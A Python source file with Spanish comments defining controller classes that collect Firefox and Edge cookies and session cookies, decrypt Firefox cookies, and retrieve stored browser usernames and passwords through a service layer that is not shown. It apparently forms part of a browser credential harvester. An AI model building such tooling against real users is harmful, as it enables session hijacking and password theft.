from models import firefox
from services.cookie_service import CookieService_Firefox, CookieService_Edge


class CookieController_Firefox:
    def __init__(self):
        self.service = CookieService_Firefox()

    # Obtner las cookies de firefox
    def get_firefox_cookies(self):
        cookies = self.service.get_firefox_cookies()
        return [cookie.to_dict() for cookie in cookies]

    # Obtner las cookies de session de firefox
    def get_session_cookies(self):
        return [cookie.to_dict() for cookie in self.service.get_session_cookies()]

    # Contar las cookies de session de firefox
    def count_session_cookies(self):
        return self.service.count_session_cookies()

# Desencriptar cookies de firefox
    def decrypt_firefox(self, encrypted_value):
        return self.service.decrypt_firefox(encrypted_value)

    def obtener_contrasenias(self):
        return [firefox.to_dict() for firefox in self.service.obtener_contrasenias()]


class CookieController_Edge:
    def __init__(self):
        self.service = CookieService_Edge()

    # Obtner las cookies de edge
    def get_edge_cookies(self):
        cookies = self.service.get_edge_cookies()
        return [cookie.to_dict() for cookie in cookies]

    # Obtner las cookies de session de edge
    def get_session_cookies(self):
        return [cookie.to_dict() for cookie in self.service.get_session_cookies()]

    # Contar las cookies de session de edge
    def count_session_cookies(self):
        return self.service.count_session_cookies()

    def obtener_usuario_contrasenia(self):
         return [cookie.to_dict() for cookie in self.service.obtener_usuario_contrasenia()]
